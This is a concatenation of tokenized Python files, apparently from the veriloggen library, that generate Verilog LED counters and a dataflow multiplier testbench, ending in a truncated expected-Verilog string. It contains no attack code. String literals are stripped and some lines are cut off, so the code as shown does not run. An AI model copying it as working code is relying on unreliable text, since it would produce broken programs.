from pyverilog . ast_code_generator . codegen import ASTCodeGenerator \n 
parser = VerilogParser ( ) \n 
expected_ast = parser . parse ( expected_verilog ) \n 
codegen = ASTCodeGenerator ( ) \n 
expected_code = codegen . visit ( expected_ast ) \n 
\n 
assert ( expected_code == code ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ ) ) ) ) ) \n 
\n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
interval = m . Parameter ( , 16 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , 8 , initval = 0 ) \n 
count = m . Reg ( , 32 , initval = 0 ) \n 
\n 
seq = Seq ( m , , clk , rst ) \n 
seq . add ( Systask ( , , led , count ) ) \n 
seq . add ( count ( count + 1 ) , cond = count < interval - 1 ) \n 
seq . add ( count ( 0 ) , cond = count == interval - 1 ) \n 
seq . add ( led ( led + 1 ) , cond = count == interval - 1 ) \n 
\n 
seq . make_always ( ) \n 
\n 
return m \n 
\n 
~~ def mkTest ( ) : \n 
~~~ m = Module ( ) \n 
\n 
# target instance \n 
led = mkLed ( ) \n 
\n 
# copy paras and ports \n 
params = m . copy_params ( led ) \n 
ports = m . copy_sim_ports ( led ) \n 
\n 
clk = ports [ ] \n 
rst = ports [ ] \n 
\n 
uut = m . Instance ( led , , \n 
params = m . connect_params ( led ) , \n 
ports = m . connect_ports ( led ) ) \n 
\n 
#simulation.setup_waveform(m, uut) \n 
simulation . setup_clock ( m , clk , hperiod = 5 ) \n 
init = simulation . setup_reset ( m , rst , m . make_reset ( ) , period = 100 ) \n 
\n 
init . add ( \n 
Delay ( 1000 ) , \n 
Systask ( ) , \n 
) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ test = mkTest ( ) \n 
verilog = test . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ \n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
width = m . Parameter ( , 8 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , width ) \n 
count = m . Reg ( , 32 ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
count ( Cond ( count == 1023 , 0 , count + 1 ) ) \n 
) ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
led ( 0 ) \n 
) . Else ( \n 
led ( Cond ( count == 1024 - 1 , led + 1 , led ) ) \n 
) ) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ led = mkLed ( ) \n 
verilog = led . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os \n 
from veriloggen import * \n 
\n 
def mkSub ( ) : \n 
~~~ m = Module ( ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
count = m . OutputReg ( , 32 ) \n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
If ( count == 1023 ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
count ( count + 1 ) \n 
) \n 
) ) \n 
return m \n 
\n 
~~ def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
width = m . Parameter ( , 8 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , width ) \n 
count = m . Wire ( , 32 ) \n 
\n 
sub = mkSub ( ) \n 
m . Instance ( sub , , m . connect_params ( sub ) , m . connect_ports ( sub ) ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
led ( 0 ) \n 
) . Else ( \n 
If ( count == 1023 ) ( \n 
led ( led + 1 ) \n 
) \n 
) ) \n 
\n 
# by multiple definition, throws an exception here \n 
inst_sub = m . Reg ( , 32 ) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ try : \n 
~~~ led = mkLed ( ) \n 
~~ except ValueError as e : \n 
~~~ print ( e . args [ 0 ] ) \n 
print ( ) \n 
sys . exit ( ) \n 
\n 
~~ raise ValueError ( "Multiple definition was not detected." ) \n 
\n 
#verilog = led.to_verilog() \n 
#print(verilog) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ \n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
width = m . Parameter ( , 8 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , width ) \n 
count = m . Reg ( , 32 ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
If ( count == 1023 ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
count ( count + 1 ) \n 
) \n 
) ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
led ( 0 ) \n 
) . Else ( \n 
If ( count == 1024 - 1 ) ( \n 
led ( led + 1 ) , \n 
\n 
SingleStatement ( SystemTask ( , , led ) ) \n 
) \n 
) ) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ led = mkLed ( ) \n 
verilog = led . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os \n 
from veriloggen import * \n 
import veriloggen . dataflow as dataflow \n 
\n 
def mkMain ( ) : \n 
# input variiable \n 
~~~ x = dataflow . Variable ( , valid = , ready = , point = 8 ) \n 
y = dataflow . Variable ( , valid = , ready = , point = 4 ) \n 
\n 
# dataflow definition \n 
z = x * y \n 
\n 
# set output attribute \n 
z . output ( , valid = , ready = ) \n 
\n 
df = dataflow . Dataflow ( z ) \n 
m = df . to_module ( ) \n 
\n 
return m \n 
\n 
~~ def mkTest ( ) : \n 
~~~ m = Module ( ) \n 
\n 
# target instance \n 
main = mkMain ( ) \n 
\n 
params = m . copy_params ( main ) \n 
ports = m . copy_sim_ports ( main ) \n 
\n 
clk = ports [ ] \n 
rst = ports [ ] \n 
\n 
xdata = ports [ ] \n 
xvalid = ports [ ] \n 
xready = ports [ ] \n 
\n 
ydata = ports [ ] \n 
yvalid = ports [ ] \n 
yready = ports [ ] \n 
\n 
zdata = ports [ ] \n 
zvalid = ports [ ] \n 
zready = ports [ ] \n 
\n 
xdata_orig = m . RegLike ( ports [ ] , name = , initval = 0 ) \n 
ydata_orig = m . RegLike ( ports [ ] , name = , initval = 0 ) \n 
zdata_orig = m . WireLike ( ports [ ] , name = ) \n 
m . Always ( ) ( xdata ( fixed . to_fixed ( xdata_orig , 8 ) ) ) \n 
m . Always ( ) ( ydata ( fixed . to_fixed ( ydata_orig , 4 ) ) ) \n 
m . Assign ( zdata_orig ( fixed . fixed_to_int ( zdata , 8 ) ) ) \n 
\n 
uut = m . Instance ( main , , \n 
params = m . connect_params ( main ) , \n 
ports = m . connect_ports ( main ) ) \n 
\n 
reset_done = m . Reg ( , initval = 0 ) \n 
reset_stmt = [ ] \n 
reset_stmt . append ( reset_done ( 0 ) ) \n 
reset_stmt . append ( xdata ( 0 ) ) \n 
reset_stmt . append ( xvalid ( 0 ) ) \n 
reset_stmt . append ( ydata ( 0 ) ) \n 
reset_stmt . append ( yvalid ( 0 ) ) \n 
reset_stmt . append ( zready ( 0 ) ) \n 
reset_stmt . append ( xdata_orig ( 0 ) ) \n 
reset_stmt . append ( ydata_orig ( 0 ) ) \n 
\n 
simulation . setup_waveform ( m , uut , xdata_orig , ydata_orig , zdata_orig ) \n 
simulation . setup_clock ( m , clk , hperiod = 5 ) \n 
init = simulation . setup_reset ( m , rst , reset_stmt , period = 100 ) \n 
\n 
nclk = simulation . next_clock \n 
\n 
init . add ( \n 
Delay ( 1000 ) , \n 
reset_done ( 1 ) , \n 
nclk ( clk ) , \n 
Delay ( 10000 ) , \n 
Systask ( ) , \n 
) \n 
\n 
def send ( name , data , valid , ready , step = 1 , waitnum = 10 ) : \n 
~~~ fsm = FSM ( m , name + , clk , rst ) \n 
count = m . TmpReg ( 32 , initval = 0 ) \n 
\n 
fsm . add ( valid ( 0 ) ) \n 
fsm . goto_next ( cond = reset_done ) \n 
for _ in range ( waitnum ) : \n 
~~~ fsm . goto_next ( ) \n 
\n 
~~ fsm . add ( valid ( 1 ) ) \n 
fsm . goto_next ( ) \n 
\n 
fsm . add ( data ( data + step ) , cond = ready ) \n 
fsm . add ( count . inc ( ) , cond = ready ) \n 
fsm . add ( valid ( 0 ) , cond = AndList ( count == 5 , ready ) ) \n 
fsm . goto_next ( cond = AndList ( count == 5 , ready ) ) \n 
\n 
for _ in range ( waitnum ) : \n 
~~~ fsm . goto_next ( ) \n 
~~ fsm . add ( valid ( 1 ) ) \n 
\n 
fsm . add ( data ( data + step ) , cond = ready ) \n 
fsm . add ( count . inc ( ) , cond = ready ) \n 
fsm . add ( valid ( 0 ) , cond = AndList ( count == 10 , ready ) ) \n 
fsm . goto_next ( cond = AndList ( count == 10 , ready ) ) \n 
\n 
fsm . make_always ( ) \n 
\n 
\n 
~~ def receive ( name , data , valid , ready , waitnum = 10 ) : \n 
~~~ fsm = FSM ( m , name + , clk , rst ) \n 
\n 
fsm . add ( ready ( 0 ) ) \n 
fsm . goto_next ( cond = reset_done ) \n 
fsm . goto_next ( ) \n 
\n 
yinit = fsm . current ( ) \n 
fsm . add ( ready ( 1 ) , cond = valid ) \n 
fsm . goto_next ( cond = valid ) \n 
for i in range ( waitnum ) : \n 
~~~ fsm . add ( ready ( 0 ) ) \n 
fsm . goto_next ( ) \n 
\n 
~~ fsm . goto ( yinit ) \n 
\n 
fsm . make_always ( ) \n 
\n 
\n 
~~ send ( , xdata_orig , xvalid , xready , step = 1 , waitnum = 10 ) \n 
send ( , ydata_orig , yvalid , yready , step = 1 , waitnum = 20 ) \n 
receive ( , zdata , zvalid , zready , waitnum = 50 ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( reset_done ) ( \n 
If ( AndList ( xvalid , xready ) ) ( \n 
Systask ( , , xdata_orig ) \n 
) , \n 
If ( AndList ( yvalid , yready ) ) ( \n 
Systask ( , , ydata_orig ) \n 
) , \n 
If ( AndList ( zvalid , zready ) ) ( \n 
Systask ( , , zdata_orig ) \n 
) \n 
) \n 
) \n 
\n 
return m \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ test = mkTest ( ) \n 
verilog = test . to_verilog ( ) \n 
print ( verilog ) \n 
\n 
# run simulator (Icarus Verilog) \n 
sim = simulation . Simulator ( test ) \n 
rslt = sim . run ( ) # display=False \n 
#rslt = sim.run(display=True) \n 
print ( rslt ) \n 
\n 
# launch waveform viewer (GTKwave) \n 
#sim.view_waveform() # background=False \n 
#sim.view_waveform(background=True) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import dataflow_mul \n 
\n 
expected_verilog = """\nmodule test;\n\n  reg CLK;\n  reg RST;\n  reg [32-1:0] xdata;\n  reg xvalid;\n  wire xready;\n  reg [32-1:0] ydata;\n  reg yvalid;\n  wire yready;\n  wire [32-1:0] zdata;\n  wire zvalid;\n  reg zready;\n\n  main\n  uut\n  (\n    .CLK(CLK),\n    .RST(RST),\n    .xdata(xdata),\n    .xvalid(xvalid),\n    .xready(xready),\n    .ydata(ydata),\n    .yvalid(yvalid),\n    .yready(yready),\n    .zdata(zdata),\n    .zvalid(zvalid),\n    .zready(zready)\n  );\n\n  reg reset_done;\n\n  initial begin\n    $dumpfile("uut.vcd");\n    $dumpvars(0, uut);\n  end\n\n\n  initial begin\n    CLK = 0;\n    forever begin\n      #5 CLK = !CLK;\n    end\n  end\n\n\n  initial begin\n    RST = 0;\n    reset_done = 0;\n    xdata = 0;\n    xvalid = 0;\n    ydata = 0;\n    yvalid = 0;\n    zready = 0;\n    #100;\n    RST = 1;\n    #100;\n    RST = 0;\n    #1000;\n    reset_done = 1;\n    @(posedge CLK);\n    #1;\n    #10000;\n    $finish;\n  end\n\n  reg [32-1:0] xfsm;\n  localparam xfsm_init = 0;\n  reg [32-1:0] _tmp_0;\n  localparam xfsm_1 = 1;\n  localparam xfsm_2 = 2;\n  localparam xfsm_3 = 3;\n  localparam xfsm_4 = 4;\n  localparam xfsm_5 = 5;\n  localparam xfsm_6 = 6;\n  localparam xfsm_7 = 7;\n  localparam xfsm_8 = 8;\n  localparam xfsm_9 = 9;\n  localparam xfsm_10 = 10;\n  localparam xfsm_11 = 11;\n  localparam xfsm_12 = 12;\n  localparam xfsm_13 = 13;\n  localparam xfsm_14 = 14;\n  localparam xfsm_15 = 15;\n  localparam xfsm_16 = 16;\n  localparam xfsm_17 = 17;\n  localparam xfsm_18 = 18;\n  localparam xfsm_19 = 19;\n  localparam xfsm_20 = 20;\n  localparam xfsm_21 = 21;\n  localparam xfsm_22 = 22;\n  localparam xfsm_23 = 23;\n  localparam xfsm_24 = 24;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      xfsm <= xfsm_init;\n      _tmp_0 <= 0;\n    end else begin\n      case(xfsm)\n        xfsm_init: begin\n          xvalid <= 0;\n          if(reset_done) begin\n            xfsm <= xfsm_1;\n          end \n        end\n        xfsm_1: begin\n          xfsm <= xfsm_2;\n        end\n        xfsm_2: begin\n          xfsm <= xfsm_3;\n        end\n        xfsm_3: begin\n          xfsm <= xfsm_4;\n        end\n        xfsm_4: begin\n          xfsm <= xfsm_5;\n        end\n        xfsm_5: begin\n          xfsm <= xfsm_6;\n        end\n        xfsm_6: begin\n          xfsm <= xfsm_7;\n        end\n        xfsm_7: begin\n          xfsm <= xfsm_8;\n        end\n        xfsm_8: begin\n          xfsm <= xfsm_9;\n        end\n        xfsm_9: begin\n          xfsm <= xfsm_10;\n        end\n        xfsm_10: begin\n          xfsm <= xfsm_11;\n        end\n        xfsm_11: begin\n          xvalid <= 1;\n          xfsm <= xfsm_12;\n        end\n        xfsm_12: begin\n          if(xready) begin\n            xdata <= xdata + 1;\n          end \n          if(xready) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 5) && xready) begin\n            xvalid <= 0;\n          end \n          if((_tmp_0 == 5) && xready) begin\n            xfsm <= xfsm_13;\n          end \n        end\n        xfsm_13: begin\n          xfsm <= xfsm_14;\n        end\n        xfsm_14: begin\n          xfsm <= xfsm_15;\n        end\n        xfsm_15: begin\n          xfsm <= xfsm_16;\n        end\n        xfsm_16: begin\n          xfsm <= xfsm_17;\n        end\n        xfsm_17: begin\n          xfsm <= xfsm_18;\n        end\n        xfsm_18: begin\n          xfsm <= xfsm_19;\n        end\n        xfsm_19: begin\n          xfsm <= xfsm_20;\n        end\n        xfsm_20: begin\n          xfsm <= xfsm_21;\n        end\n        xfsm_21: begin\n          xfsm <= xfsm_22;\n        end\n        xfsm_22: begin\n          xfsm <= xfsm_23;\n        end\n        xfsm_23: begin\n          xvalid <= 1;\n          if(xready) begin\n            xdata <= xdata + 1;\n          end \n          if(xready) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 10) && xready) begin\n            xvalid <= 0;\n          end \n          if((_tmp_0 == 10) && xready) begin\n            xfsm <= xfsm_24;\n          end \n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] yfsm;\n  localparam yfsm_init = 0;\n  reg [32-1:0] _tmp_1;\n  localparam yfsm_1 = 1;\n  localparam yfsm_2 = 2;\n  localparam yfsm_3 = 3;\n  localparam yfsm_4 = 4;\n  localparam yfsm_5 = 5;\n  localparam yfsm_6 = 6;\n  localparam yfsm_7 = 7;\n  localparam yfsm_8 = 8;\n  localparam yfsm_9 = 9;\n  localparam yfsm_10 = 10;\n  localparam yfsm_11 = 11;\n  localparam yfsm_12 = 12;\n  localparam yfsm_13 = 13;\n  localparam yfsm_14 = 14;\n  localparam yfsm_15 = 15;\n  localparam yfsm_16 = 16;\n  localparam yfsm_17 = 17;\n  localparam yfsm_18 = 18;\n  localparam yfsm_19 = 19;\n  localparam yfsm_20 = 20;\n  localparam yfsm_21 = 21;\n  localparam yfsm_22 = 22;\n  localparam yfsm_23 = 23;\n  localparam yfsm_24 = 24;\n  localparam yfsm_25 = 25;\n  localparam yfsm_26 = 26;\n  localparam yfsm_27 = 27;\n  localparam yfsm_28 = 28;\n  localparam yfsm_29 = 29;\n  localparam yfsm_30 = 30;\n  localparam yfsm_31 = 31;\n  localparam yfsm_32 = 32;\n  localparam yfsm_33 = 33;\n  localparam yfsm_34 = 34;\n  localparam yfsm_35 = 35;\n  localparam yfsm_36 = 36;\n  localparam yfsm_37 = 37;\n  localparam yfsm_38 = 38;\n  localparam yfsm_39 = 39;\n  localparam yfsm_40 = 40;\n  localparam yfsm_41 = 41;\n  localparam yfsm_42 = 42;\n  localparam yfsm_43 = 43;\n  localparam yfsm_44 = 44;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      yfsm <= yfsm_init;\n      _tmp_1 <= 0;\n    end else begin\n      case(yfsm)\n        yfsm_init: begin\n          yvalid <= 0;\n          if(reset_done) begin\n            yfsm <= yfsm_1;\n          end \n        end\n        yfsm_1: begin\n          yfsm <= yfsm_2;\n        end\n        yfsm_2: begin\n          yfsm <= yfsm_3;\n        end\n        yfsm_3: begin\n          yfsm <= yfsm_4;\n        end\n        yfsm_4: begin\n          yfsm <= yfsm_5;\n        end\n        yfsm_5: begin\n          yfsm <= yfsm_6;\n        end\n        yfsm_6: begin\n          yfsm <= yfsm_7;\n        end\n        yfsm_7: begin\n          yfsm <= yfsm_8;\n        end\n        yfsm_8: begin\n          yfsm <= yfsm_9;\n        end\n        yfsm_9: begin\n          yfsm <= yfsm_10;\n        end\n        yfsm_10: begin\n          yfsm <= yfsm_11;\n        end\n        yfsm_11: begin\n          yfsm <= yfsm_12;\n        end\n        yfsm_12: begin\n          yfsm <= yfsm_13;\n        end\n        yfsm_13: begin\n          yfsm <= yfsm_14;\n        end\n        yfsm_14: begin\n          yfsm <= yfsm_15;\n        end\n        yfsm_15: begin\n          yfsm <= yfsm_16;\n        end\n        yfsm_16: begin\n          yfsm <= yfsm_17;\n        end\n        yfsm_17: begin\n          yfsm <= yfsm_18;\n        end\n        yfsm_18: begin\n          yfsm <= yfsm_19;\n        end\n        yfsm_19: begin\n          yfsm <= yfsm_20;\n        end\n        yfsm_20: begin\n          yfsm <= yfsm_21;\n        end\n        yfsm_21: begin\n          yvalid <= 1;\n          yfsm <= yfsm_22;\n        end\n        yfsm_22: begin\n          if(yready) begin\n            ydata <= ydata + 1;\n          end \n          if(yready) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 5) && yready) begin\n            yvalid <= 0;\n          end \n          if((_tmp_1 == 5) && yready) begin\n            yfsm <= yfsm_23;\n          end \n        end\n        yfsm_23: begin\n          yfsm <= yfsm_24;\n        end\n        yfsm_24: begin\n          yfsm <= yfsm_25;\n        end\n        yfsm_25: begin\n          yfsm <= yfsm_26;\n        end\n        yfsm_26: begin\n          yfsm <= yfsm_27;\n        end\n        yfsm_27: begin\n          yfsm <= yfsm_28;\n        end\n        yfsm_28: begin\n          yfsm <= yfsm_29;\n        end\n        yfsm_29: begin\n          yfsm <= yfsm_30;\n        end\n        yfsm_30: begin\n          yfsm <= yfsm_31;\n        end\n        yfsm_31: begin\n          yfsm <= yfsm_32;\n        end\n        yfsm_32: begin\n          yfsm <= yfsm_33;\n        end\n        yfsm_33: begin\n          yfsm <= yfsm_34;\n        end\n        yfsm_34: begin\n          yfsm <= yfsm_35;\n        end\n        yfsm_35: begin\n          yfsm <= yfsm_36;\n        end\n        yfsm_36: begin\n          yfsm <= yfsm_37;\n        end\n        yfsm_37: begin\n          yfsm <= yfsm_38;\n        end\n        yfsm_38: begin\n          yfsm <= yfsm_39;\n        end\n        yfsm_39: begin\n          yfsm <= yfsm_40;\n        end\n        yfsm_40: begin\n          yfsm <= yfsm_41;\n        end\n        yfsm_41: begin\n          yfsm <= yfsm_42;\n        end\n        yfsm_42: begin\n          yfsm <= yfsm_43;\n        end\n        yfsm_43: begin\n          yvalid <= 1;\n          if(yready) begin\n            ydata <= ydata + 1;\n          end \n          if(yready) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 10) && yready) begin\n            yvalid <= 0;\n          end \n          if((_tmp_1 == 10) && yready) begin\n            yfsm <= yfsm_44;\n          end \n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] zfsm;\n  localparam zfsm_init = 0;\n  localparam zfsm_1 = 1;\n  localparam zfsm_2 = 2;\n  localparam zfsm_3 = 3;\n  localparam zfsm_4 = 4;\n  localparam zfsm_5 = 5;\n  localparam zfsm_6 = 6;\n  localparam zfsm_7 = 7;\n  localparam zfsm_8 = 8;\n  localparam zfsm_9 = 9;\n  localparam zfsm_10 = 10;\n  localparam zfsm_11 = 11;\n  localparam zfsm_12 = 12;\n  localparam zfsm_13 = 13;\n  localparam zfsm_14 = 14;\n  localparam zfsm_15 = 15;\n  localparam zfsm_16 = 16;\n  localparam zfsm_17 = 17;\n  localparam zfsm_18 = 18;\n  localparam zfsm_19 = 19;\n  localparam zfsm_20 = 20;\n  localparam zfsm_21 = 21;\n  localparam zfsm_22 = 22;\n  localparam zfsm_23 = 23;\n  localparam zfsm_24 = 24;\n  localparam zfsm_25 = 25;\n  localparam zfsm_26 = 26;\n  localparam zfsm_27 = 27;\n  localparam zfsm_28 = 28;\n  localparam zfsm_29 = 29;\n  localparam zfsm_30 = 30;\n  localparam zfsm_31 = 31;\n  localparam zfsm_32 = 32;\n  localparam zfsm_33 = 33;\n  localparam zfsm_34 = 34;\n  localparam zfsm_35 = 35;\n  localparam zfsm_36 = 36;\n  localparam zfsm_37 = 37;\n  localparam zfsm_38 = 38;\n  localparam zfsm_39 = 39;\n  localparam zfsm_40 = 40;\n  localparam zfsm_41 = 41;\n  localparam zfsm_42 = 42;\n  localparam zfsm_43 = 43;\n  localparam zfsm_44 = 44;\n  localparam zfsm_45 = 45;\n  localparam zfsm_46 = 46;\n  localparam zfsm_47 = 47;\n  localparam zfsm_48 = 48;\n  localparam zfsm_49 = 49;\n  localparam zfsm_50 = 50;\n  localparam zfsm_51 = 51;\n  localparam zfsm_52 = 52;\n  localparam zfsm_53 = 53;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      zfsm <= zfsm_init;\n    end else begin\n      case(zfsm)\n        zfsm_init: begin\n          zready <= 0;\n          if(reset_done) begin\n            zfsm <= zfsm_1;\n          end \n        end\n        zfsm_1: begin\n          zfsm <= zfsm_2;\n        end\n        zfsm_2: begin\n          if(zvalid) begin\n            zready <= 1;\n          end \n          if(zvalid) begin\n            zfsm <= zfsm_3;\n          end \n        end\n        zfsm_3: begin\n          zready <= 0;\n          zfsm <= zfsm_4;\n        end\n        zfsm_4: begin\n          zready <= 0;\n          zfsm <= zfsm_5;\n        end\n        zfsm_5: begin\n          zready <= 0;\n          zfsm <= zfsm_6;\n        end\n        zfsm_6: begin\n          zready <= 0;\n          zfsm <= zfsm_7;\n        end\n        zfsm_7: begin\n          zready <= 0;\n          zfsm <= zfsm_8;\n        end\n        zfsm_8: begin\n          zready <= 0;\n          zfsm <= zfsm_9;\n        end\n        zfsm_9: begin\n          zready <= 0;\n          zfsm <= zfsm_10;\n        end\n        zfsm_10: begin\n          zready <= 0;\n          zfsm <= zfsm_11;\n        end\n        zfsm_11: begin\n          zready <= 0;\n          zfsm <= zfsm_12;\n        end\n        zfsm_12: begin\n          zready <= 0;\n          zfsm <= zfsm_13;\n        end\n        zfsm_13: begin\n          zready <= 0;\n          zfsm <= zfsm_14;\n        end\n        zfsm_14: begin\n          zready <= 0;\n          zfsm <= zfsm_15;\n        end\n        zfsm_15: begin\n          zready <= 0;\n          zfsm <= zfsm_16;\n        end\n        zfsm_16: begin\n          zready <= 0;\n          zfsm <= zfsm_17;\n        end\n        zfsm_17: begin\n          zready <= 0;\n          zfsm <= zfsm_18;\n        end\n        zfsm_18: begin\n          zready <= 0;\n          zfsm <= zfsm_19;\n        end\n        zfsm_19: begin\n          zready <= 0;\n          zfsm <= zfsm_20;\n        end\n        zfsm_20: begin\n          zready <= 0;\n          zfsm <= zfsm_21;\n        end\n        zfsm_21: begin\n          zready <= 0;\n          zfsm <= zfsm_22;\n        end\n        zfsm_22: begin\n          zready <= 0;\n          zfsm <= zfsm_23;\n        end\n        zfsm_23: begin\n          zready <= 0;\n          zfsm <= zfsm_24;\n        end\n        zfsm_24: begin\n          zready <= 0;\n          zfsm <= zfsm_25;\n        end\n        zfsm_25: begin\n          zready <= 0;\n          zfsm <= zfsm_26;\n        end\n        zfsm_26: begin\n          zready <= 0;\n          zfsm <= zfsm_27;\n        end\n        zfsm_27: begin\n          zready <= 0;\n          zfsm <= zfsm_28;\n        end\n        zfsm_28: begin\n          zready <= 0;\n          zfsm <= zfsm_29;\n        end\n        zfsm_29: begin\n          zready <= 0;\n          zfsm <= zfsm_30;\n        end\n        zfsm_30: begin\n          zready <= 0;\n          zfsm <= zfsm_31;\n        end\n        zfsm_31: begin\n          zready <= 0;\n          zfsm <= zfsm_32;\n        end\n        zfsm_32: begin\n          zready <= 0;\n          zfsm <= zfsm_33;\n        end\n        zfsm_33: begin\n          zready <= 0;\n          zfsm <= zfsm_34;\n        end\n        zfsm_34: begin\n          zready <= 0;\n          zfsm <= zfsm_35;\n        end\n        zfsm_35: begin\n          zready <= 0;\n          zfsm <= zfsm_36;\n        end\n        zfsm_36: begin\n          zready <= 0;\n          zfsm <= zfsm_37;\n        end\n        zfsm_37: begin\n          zready <= 0;\n          zfsm <= zfsm_38;\n        end\n        zfsm_38: begin\n          zready <= 0;\n          zfsm <= zfsm_39;\n        end\n        zfsm_39: begin\n          zready <= 0;\n          zfsm <= zfsm_40;\n        end\n        zfsm_40: begin\n          zready <= 0;\n          zfsm <= zfsm_41;\n        end\n        zfsm_41: begin\n          zready <= 0;\n          zfsm <= zfsm_42;\n        end\n        zfsm_42: begin\n          zready <= 0;\n          zfsm <= zfsm_43;\n        end\n        zfsm_43: begin\n          zready <= 0;\n          zfsm <= zfsm_44;\n        end\n        zfsm_44: begin\n          zready <= 0;\n          zfsm <= zfsm_45;\n        end\n        zfsm_45: begin\n          zready <= 0;\n          zfsm <= zfsm_46;\n        end\n        zfsm_46: begin\n          zready <= 0;\n          zfsm <= zfsm_47;\n        end\n        zfsm_47: begin\n          zready <= 0;\n          zfsm <= zfsm_48;\n        end\n        zfsm_48: begin\n          zready <= 0;\n          zfsm <= zfsm_49;\n        end\n        zfsm_49: begin\n          zready <= 0;\n          zfsm <= zfsm_50;\n        end\n        zfsm_50: begin\n          zready <= 0;\n          zfsm <= zfsm_51;\n        end\n        zfsm_51: begin\n          zready <= 0;\n          zfsm <= zfsm_52;\n        end\n        zfsm_52: begin\n          zready <= 0;\n          zfsm <= zfsm_53;\n        end\n        zfsm_53: begin\n          zfsm <= zfsm_2;\n        end\n      endcase\n    end\n  end\n\n\n  always @(posedge CLK) begin\n    if(reset_done) begin\n      if(xvalid && xready) begin\n        $display("xdata=%d", xdata);\n      end \n      if(yvalid && yready) begin\n        $display("ydata=%d", ydata);\n      end \n      if(zvalid && zready) begin\n        $display("zdata=%d", zdata);\n      end \n    end \n  end\n\n\nendmodule\n\n\n\nmodule main\n(\n  input CLK,\n  input RST,\n  input [32-1:0] xdata,\n  input xvalid,\n  output xready,\n  input [32-1:0] ydata,\n  input yvalid,\n  output yready,\n  output [32-1:0] zdata,\n  output zvalid,\n  input zready\n);\n\n  wire [32-1:0] _tmp_data_0;\n  wire _tmp_valid_0;\n  wire _tmp_ready_0;\n  wire [64-1:0] _tmp_odata_0;\n  reg [64-1:0] _tmp_data_reg_0;\n  assign _tmp_data_0 = _tmp_data_reg_0;\n  wire _tmp_ovalid_0;\n  reg _tmp_valid_reg_0;\n  assign _tmp_valid_0 = _tmp_valid_reg_0;\n  wire _tmp_enable_0;\n  wire _tmp_update_0;\n  assign _tmp_enable_0 = (_tmp_ready_0 || !_tmp_valid_0) && (xready && yready) && (xvalid && yvalid);\n  assign _tmp_update_0 = _tmp_ready_0 || !_tmp_valid_0;\n\n  multiplier_0\n  mul0\n  (\n    .CLK(CLK),\n    .RST(RST),\n    .update(_tmp_update_0),\n    .enable(_tmp_enable_0),\n    .valid(_tmp_ovalid_0),\n    .a(xdata),\n    .b(ydata),\n    .c(_tmp_odata_0)\n  );\n\n  assign xready = (_tmp_ready_0 || !_tmp_valid_0) && (xvalid && yvalid);\n  assign yready = (_tmp_ready_0 || !_tmp_valid_0) && (xvalid && yvalid);\n  assign zdata = _tmp_data_0;\n  assign zvalid = _tmp_valid_0;\n  assign _tmp_ready_0 = zready;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      _tmp_data_reg_0 <= 